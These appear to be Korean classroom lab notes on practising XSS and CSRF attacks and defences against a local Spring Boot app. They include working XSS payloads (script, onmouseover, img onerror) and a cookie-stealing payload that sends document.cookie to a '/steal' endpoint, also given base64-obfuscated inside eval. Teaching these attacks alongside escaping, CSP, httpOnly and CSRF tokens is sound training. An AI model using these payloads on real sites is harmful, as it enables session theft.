■ xss 실습
01_XSS.html, 02_StoredXSS.html
1. 공격하기 
	1.1 공격  - 최신 브라우져는 무시한다.
	<script>alert('XSS 공격 성공!')</script>			

	1.2. 공격  - 최신 브라우져는 문자열로 처리한다. 
	" onmouseover="alert('XSS 성공!')

	1.3. 공격  - 성공!! 
	<img src="x" onerror="alert('XSS!')">

React, Vue, Angular, springboot jsp 렌더리시 모두 기본적으로 HTML을 escape해서 렌더링한다.
<, >, ", ', & 같은 HTML 특수문자는 안전하게 변환

img, iframe, div 등의 속성 이벤트는 여전히 취약
<svg onload="...">
<iframe srcdoc="...">

	1.4 [SpringBootCsrfTest:9000 실행]
	http://localhost:9000/eureka/index.jsp
	XSS.html 실행하기  ==> 공격이 잘된다. 
	
	
	1.5 방어하기 이스케이프 처리 
	  리액트 book에서 데이타를 입력하고 렌더링해본다 ==> 리액트도 자동 이스케이프 처리 한다.
	 
	1.6 방어하기  CSP 헤더 적용하기 
	com.uplus.eureka.config> SecurityConfiguration  주석 풀기 
	com.uplus.eureka.config> WebMvcConfiguration 에서 securityConfiguration를 위한 주석 풀기 
	XSS.html	==> F12 네트워크 열고  새로 고침
	==> 응답 헤더에서  CSP 헤더 확인하기 
				
	1.6	
	com.uplus.eureka.config> SecurityConfiguration  주석 하기 
			
	XSSDefenseForm.jsp 실행
	==> http://localhost:9000/eureka/index.jsp에서 2번 클릭
	==> springboot에서 controller를 통해 요청한 jsp를 렌더링할 때 "자동으로" HTML 이스케이프 처리된다. 
	

2.CSRF 실습하기 
[SpringBootTest_JWT_swagger:8080 실행]
  
[SpringBootCsrfTest] 
2.2 src>main>webapp>WEB-INF>views>CsrfAttackForm.jsp 작성하기 
2.3  실행하기 	 
[SpringBootCsrfTest:9000 실행] 
http://localhost:9000/eureka/index.jsp 에서 3번 클릭

입력 데이타 
location.href='http://localhost:8080/eureka/steal?cookie='+document.cookie
base 64로 인코딩하기
<img src="x" onerror="eval(atob('bG9jYXRpb24uaHJlZj0naHR0cDovL2xvY2FsaG9zdDo4MDgwL2V1cmVrYS9zdGVhbD9jb29raWU9Jytkb2N1bWVudC5jb29raWU='))">


2.4 방어하기  httpOnly 붙이기

2.5 CSRF 토큰 발급하기  



